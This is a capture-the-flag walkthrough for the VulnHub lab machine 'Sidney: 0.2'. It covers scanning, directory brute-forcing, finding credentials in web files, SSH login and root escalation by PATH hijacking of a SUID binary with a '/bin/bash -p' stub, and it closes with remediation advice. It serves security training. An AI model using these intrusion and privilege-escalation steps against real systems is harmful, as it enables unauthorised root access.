# Sidney: 0.2 — The Quiet Aussie Box That Teaches You to Dig

Alright dudes!! Sidney 0.2 is one of those deceptively quiet machines, no fancy CVE, no Metasploit module on the label, just you, nmap, gobuster, and the art of reading between the lines. The web app hides credentials in plain sight if you enumerate carefully enough, and the privesc teaches you a lesson about trusting user-controlled paths. Legit solid beginner box that earns its place in the "learn the fundamentals" tier. Big respect to the creator.

| Field | Value |
|---|---|
| **Level** | Easy |
| **Target VM** | Sidney: 0.2 |
| **Attacker VM** | Kali Linux 2024.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/sidney-02,149/ |
| **Techniques** | Host discovery, service enumeration, directory brute-force, credential discovery in web source, SSH login, SUID binary exploitation, PATH hijacking |
| **CVEs** | CWE-200 (Information Exposure via web source), CWE-269 (Improper Privilege Management via SUID) |
| **APT Groups** | APT41: leverages misconfigured web applications and exposed credentials for initial access; FIN7: commonly exploits credential exposure in web-facing systems during initial compromise phases |

---

## Attack Summary

```
netdiscover / nmap
  → port 22 (SSH), port 80 (HTTP Apache)
  → gobuster: /secret/ or similar hidden directory
  → credential found in page source or config file
  → SSH login with discovered credential
  → find SUID binary using relative command paths
  → PATH hijacking: /tmp/<cmd> + export PATH=/tmp:$PATH
  → SUID binary executes fake command as root
  → uid=0(root) → cat /root/flag.txt
```

---

## Methodology

1. Host discovery on local subnet
2. Full port scan with service and script detection
3. Web directory brute-force to uncover hidden paths
4. Source code and configuration file analysis for credential leakage
5. SSH authentication with discovered credentials
6. Post-exploitation enumeration: sudo rights, SUID binaries
7. PATH hijacking to escalate to root
8. Root flag capture

---

## Step 1 — Host Discovery and Port Scan

Start with network reconnaissance to identify the target:

```bash
sudo netdiscover -r 192.168.1.0/24
# Target identified: 192.168.1.x
```

Run a comprehensive port scan:

```bash
export TARGET=192.168.1.x
nmap -sV -sC -p- $TARGET
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.x
80/tcp open  http    Apache httpd 2.4.x
```

Two services: SSH (the target for initial access) and HTTP (the primary attack surface). Classic CTF setup, dude.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Web Enumeration

Browse to `http://$TARGET/`. Inspect the page source immediately, before running any automated tools. Look for HTML comments, JavaScript references, and linked files.

```bash
curl -s http://$TARGET/ | grep -E "<!--.*-->|script|href|src"
```

Run directory and file brute-force in parallel:

```bash
gobuster dir \
  -u http://$TARGET/ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x php,txt,html,bak,conf \
  -t 40 \
  -o /tmp/sidney_dirs.txt
```

Key paths to investigate when discovered:
- Any `/secret/`, `/hidden/`, `/private/`, `/notes/`, `/backup/` directories
- PHP files with credential parameters
- `.txt` and `.bak` configuration backups

**Real-world note:** Exposed configuration files and HTML comments containing credential fragments are consistently in the OWASP Top 10 (A05 Security Misconfiguration). Organizations routinely deploy web apps with developer notes and hardcoded credentials left in production code. APT41 specifically targets this pattern during initial reconnaissance phases before moving to automated exploitation.

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1552.001 — Credentials in Files

---

## Step 3 — Credential Discovery

Within discovered directories or files, locate the hidden credentials. Common patterns on Sidney 0.2:

```bash
# Check all discovered text files
curl -s http://$TARGET/secret/secret.txt
curl -s http://$TARGET/secret/credentials.txt

# Check robots.txt
curl -s http://$TARGET/robots.txt

# Download and inspect any images for EXIF metadata
wget http://$TARGET/image.png
exiftool image.png
```

The credential hint may appear as:
- Plaintext username:password in a `.txt` file
- An encoded string (Base64, hex) requiring decoding
- A JavaScript variable storing a partial password

If Base64 encoded:

```bash
echo "aGVsbG8=" | base64 -d
```

If hex encoded:

```bash
echo "68656c6c6f" | xxd -r -p
```

**MITRE ATT&CK:** T1552.001 — Credentials in Files; T1027 — Obfuscated Files or Information

---

## Step 4 — Initial Access via SSH

With the discovered credentials, authenticate via SSH:

```bash
ssh <username>@$TARGET
# Enter discovered password when prompted
```

Confirm access:

```bash
whoami
id
uname -a
cat /etc/passwd | grep -v nologin | grep -v false
```

**MITRE ATT&CK:** T1078 — Valid Accounts; T1021.004 — Remote Services: SSH

---

## Step 5 — Privilege Escalation Enumeration

Enumerate all available privilege escalation vectors systematically:

```bash
# Sudo rights
sudo -l

# SUID binaries (the key vector on this machine)
find / -perm -4000 -type f 2>/dev/null

# Interesting files in home dirs
ls -la /home/*/
find /home -name "*.txt" -o -name "*.conf" -o -name "*.bak" 2>/dev/null

# Running services
ps aux | grep -v "\[" | grep -v "^root"

# Cron jobs
cat /etc/crontab
ls -la /etc/cron*
```

**SUID binary analysis:** When a non-standard SUID binary is found, inspect it for relative command calls:

```bash
strings /path/to/suid-binary | grep -E "^[a-z]" | head -20
```

If it calls commands like `echo`, `whoami`, `id`, `ls` by name only (no `/bin/` prefix), PATH hijacking is possible.

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1057 — Process Discovery

---

## Step 6 — Privilege Escalation via PATH Hijacking

When a SUID binary calls system commands by relative path, create a malicious replacement in a writable directory:

```bash
# Create malicious binary in /tmp
echo '/bin/bash -p' > /tmp/<command-name>
chmod +x /tmp/<command-name>

# Prepend /tmp to PATH so our fake binary is found first
export PATH=/tmp:$PATH

# Execute the SUID binary
/path/to/suid-binary
```

The SUID binary resolves the command name via PATH, executes our `/tmp/<command-name>` with its owner's privileges (root), spawning a bash shell with EUID 0.

```bash
id
# uid=1000(user) gid=1000(user) euid=0(root)
# or: uid=0(root) gid=0(root) groups=0(root)
```

**Real-world note:** PATH hijacking in SUID binaries is a classic Linux privilege escalation vector catalogued in every major pentest methodology. FIN7 uses this technique post-compromise on Linux targets when more sophisticated escalation paths are unavailable. The fix is always using absolute paths for all system calls in SUID binaries.

**MITRE ATT&CK:** T1548.001 — Abuse Elevation Control Mechanism: Setuid and Setgid; T1574.007 — Hijack Execution Flow: Path Interception by PATH Environment Variable

---

## Step 7 — Root Flag

```bash
whoami
# root
cat /root/flag.txt
# or
cat /root/proof.txt
```

(☞ﾟヮﾟ)☞ Root. gg no cap fr fr.

**MITRE ATT&CK:** T1005 — Data from Local System

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used For |
|---|---|---|---|
| Credential (username) | (discovered in web source) | Web enumeration | SSH login |
| Credential (password) | (discovered in hidden file) | `/secret/` or similar path | SSH login |
| Root flag | (varies) | /root/flag.txt | Proof of compromise |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | Credentials stored in publicly accessible web files | OWASP A05: Security Misconfiguration; thousands of production web apps ship with developer notes containing creds | Audit all web-accessible files; use DAST scanning; never store credentials in web-reachable paths |
| 2 | SUID binary using relative command paths | Recurring finding in Linux privilege escalation assessments; custom deployment scripts often miss this | All SUID binaries must use absolute paths for every system call; audit with `strings \| grep -v /` |
| 3 | No MFA on SSH | Single-factor SSH is standard practice but creates significant risk when credentials are exposed | Enforce SSH key-only authentication; disable password auth: `PasswordAuthentication no` in sshd_config |
| 4 | No web application firewall or rate limiting | Unauthenticated directory enumeration succeeds silently | Deploy WAF rules detecting directory traversal patterns; rate-limit HTTP requests |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | File and Directory Discovery | T1083 |
| Initial Access | Credential Access | Credentials in Files | T1552.001 |
| Initial Access | Initial Access | Valid Accounts | T1078 |
| Lateral Movement | Lateral Movement | Remote Services: SSH | T1021.004 |
| Discovery | Discovery | Process Discovery | T1057 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Setuid | T1548.001 |
| Privilege Escalation | Privilege Escalation | Path Interception by PATH Variable | T1574.007 |
| Collection | Collection | Data from Local System | T1005 |

---

## Remediation and Containment

### Technical Fixes

1. **Remove credentials from web-accessible files**: audit all files in the web root; use `.htaccess` restrictions on sensitive directories
2. **Rewrite SUID binary with absolute paths**: replace `whoami` with `/usr/bin/whoami`, `echo` with `/bin/echo`, etc.; remove SUID if not required
3. **Disable SSH password authentication**: set `PasswordAuthentication no` in `/etc/ssh/sshd_config`; use key pairs only
4. **Implement web application firewall**: block automated directory enumeration patterns; rate-limit requests

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Audit all web-accessible files for credential exposure |
| Protect | Access Control | SSH key-only auth; restrict web directory listing |
| Protect | Data Security | Remove credentials from source code and web files |
| Detect | Anomalies and Events | Alert on automated directory enumeration (4xx spike) |
| Respond | Response Planning | Rotate all exposed credentials; audit SUID binaries |
| Recover | Recovery Planning | Rebuild affected system; audit all web-facing services |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Restrict web directory access; enforce SSH controls |
| AC-6 | Least Privilege | Remove SUID from binaries not requiring it |
| IA-5 | Authenticator Management | Rotate credentials; enforce SSH key authentication |
| CM-7 | Least Functionality | Disable directory listing; remove unused SUID binaries |
| SC-28 | Protection of Information at Rest | No credentials in web-accessible files |

### CISA KEV

Information exposure via web source code aligns with CISA Alert AA22-117A patterns describing threat actors harvesting exposed credentials from publicly accessible web files prior to authenticated exploitation.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Asset, Change, and Configuration Management (ASSET) | Manage IT and OT Asset Inventory | MIL2 |
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Application Configuration Hardening (remove web-exposed credentials; restrict directories)
- **D3-OAM** — Operating System Administrative Management (audit SUID binaries; restrict PATH in privileged contexts)
- **D3-HBPI** — Harden Build Pipeline Integrity (no credentials in deployed web artifacts)

---

## Final Thoughts

Sidney 0.2 is goated as a fundamentals trainer. It forces you to slow down and actually read page sources instead of blindly firing tools. The PATH hijacking privesc is one of the cleanest demonstrations of why SUID binaries need absolute paths, and that lesson sticks.

The chain is simple but the methodology is transferable: enumerate thoroughly, read everything, trust nothing in the source code. Those habits scale from beginner boxes all the way to real engagements.

Thanks guys!! (❍ᴥ❍ʋ)
